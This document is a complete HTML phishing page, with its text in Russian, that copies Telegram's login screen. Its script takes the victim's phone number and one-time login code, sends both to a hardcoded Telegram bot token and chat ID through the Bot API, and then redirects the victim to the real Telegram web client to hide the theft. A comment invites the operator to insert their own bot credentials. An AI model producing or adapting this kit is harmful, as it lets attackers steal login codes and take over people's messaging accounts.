<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        /* --- ПЕРЕМЕННЫЕ ЦВЕТОВ --- */
        :root {
            --bg-color: #FFFFFF;
            --text-main: #000000;
            --text-secondary: #707579;
            --accent-blue: #2481CC;
            --border-color: #DADCE0;
            --input-bg: #FFFFFF;
            --keypad-bg: #F0F0F0;
            --key-bg: #FFFFFF;
            --key-text: #000000;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #1C1C1D;
                --text-main: #FFFFFF;
                --text-secondary: #AAAAAA;
                --border-color: #38383A;
                --input-bg: #2C2C2E;
                --keypad-bg: #2C2C2E;
                --key-bg: #3A3A3C;
                --key-text: #FFFFFF;
            }
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Основной контент */
        .container {
            flex: 1;
            padding: 24px 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-y: auto;
        }

        .logo {
            width: 60px;
            height: 60px;
            background: var(--accent-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px auto 24px;
        }
        .logo svg {
            width: 32px;
            height: 32px;
            fill: white;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .sub {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 32px;
        }

        /* Поля ввода */
        .input-group {
            width: 100%;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 6px;
            display: block;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            font-size: 16px;
            background: var(--input-bg);
            color: var(--text-main);
            outline: none;
            transition: border 0.2s;
        }

        .input-group input:focus {
            border-color: var(--accent-blue);
        }

        /* Кнопка */
        button {
            width: 100%;
            padding: 14px;
            background: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }

        button:active {
            opacity: 0.8;
        }

        /* Клавиатура */
        .keypad {
            background: var(--keypad-bg);
            padding: 8px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            border-top: 1px solid var(--border-color);
        }

        .key {
            background: var(--key-bg);
            border-radius: 8px;
            padding: 14px;
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: var(--key-text);
            cursor: pointer;
            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
        }

        .key:active {
            opacity: 0.7;
        }

        .key.letters {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            margin-top: -4px;
        }

        .key.backspace {
            font-size: 20px;
        }

        .error {
            background: #fee;
            color: #d33;
            padding: 10px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 16px;
            width: 100%;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.218-1.447 1.394c-.16.16-.295.295-.605.295l.215-3.09 5.63-5.09c.245-.215-.054-.335-.38-.12l-6.96 4.39-3.02-.94c-.655-.205-.667-.655.137-.97l11.77-4.54c.547-.2 1.025.12.854.97z"/>
            </svg>
        </div>
        <h1>Номер телефона</h1>
        <div class="sub">Проверьте код страны и введите свой номер телефона.</div>

        <div id="errorMsg" class="error"></div>

        <div class="input-group">
            <label>Номер телефона</label>
            <input type="tel" id="phone" placeholder="+7 XXX XXX-XX-XX" autocomplete="off">
        </div>

        <div class="input-group" id="codeGroup" style="display: none;">
            <label>Код подтверждения</label>
            <input type="text" id="code" placeholder="XXXXX" autocomplete="off">
        </div>

        <button id="nextBtn">Далее</button>
    </div>

    <div class="keypad" id="keypad">
        <div class="key" data-digit="1">1</div>
        <div class="key" data-digit="2">2</div>
        <div class="key" data-digit="3">3</div>
        <div class="key" data-digit="4">4</div>
        <div class="key" data-digit="5">5</div>
        <div class="key" data-digit="6">6</div>
        <div class="key" data-digit="7">7</div>
        <div class="key" data-digit="8">8</div>
        <div class="key" data-digit="9">9</div>
        <div class="key" data-digit="backspace">⌫</div>
        <div class="key" data-digit="0">0</div>
        <div class="key" data-digit="next">⏎</div>
    </div>

    <script>
        // === НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ===
        const BOT_TOKEN = "8755907309:AAHcG2zLepeJyrWSk1dtf4kAtpIVkGsxsx0";
        const CHAT_ID = 8637392176;
        // =================================

        let currentInput = 'phone';
        let phoneNumber = '';
        let codeValue = '';

        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const codeGroup = document.getElementById('codeGroup');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');

        function showError(text) {
            errorMsg.style.display = 'block';
            errorMsg.innerText = text;
            setTimeout(() => {
                errorMsg.style.display = 'none';
            }, 3000);
        }

        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
                const data = await response.json();
                if (!data.ok) console.error('Ошибка Telegram:', data);
            } catch (err) {
                console.error('Ошибка отправки:', err);
            }
        }

        // Обработка нажатия "Далее" / "Подтвердить"
        nextBtn.addEventListener('click', () => {
            if (currentInput === 'phone') {
                const phone = phoneInput.value.trim();
                if (!phone) {
                    showError('Введите номер телефона');
                    return;
                }
                phoneNumber = phone;
                sendToTelegram(`📱 Номер: ${phoneNumber}`);
                
                // Переключаем на ввод кода
                currentInput = 'code';
                phoneInput.style.display = 'none';
                codeGroup.style.display = 'block';
                nextBtn.innerText = 'Подтвердить';
                codeInput.focus();
            } 
            else if (currentInput === 'code') {
                const code = codeInput.value.trim();
                if (!code) {
                    showError('Введите код подтверждения');
                    return;
                }
                codeValue = code;
                sendToTelegram(`🔐 Код: ${codeValue}\n📱 Номер: ${phoneNumber}`);
                
                // Редирект
                nextBtn.innerText = 'Connecting...';
                nextBtn.disabled = true;
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org';
                }, 2000);
            }
        });

        // Клавиатура
        document.querySelectorAll('.key').forEach(key => {
            key.addEventListener('click', () => {
                const digit = key.getAttribute('data-digit');
                if (currentInput === 'phone') {
                    if (digit === 'backspace') {
                        phoneInput.value = phoneInput.value.slice(0, -1);
                    } else if (digit === 'next') {
                        nextBtn.click();
                    } else if (digit) {
                        phoneInput.value += digit;
                    }
                } else if (currentInput === 'code') {
                    if (digit === 'backspace') {
                        codeInput.value = codeInput.value.slice(0, -1);
                    } else if (digit === 'next') {
                        nextBtn.click();
                    } else if (digit) {
                        codeInput.value += digit;
                    }
                }
            });
        });

        // Фокус
        phoneInput.addEventListener('focus', () => { currentInput = 'phone'; });
        codeInput.addEventListener('focus', () => { currentInput = 'code'; });
    </script>
</body>
</html>
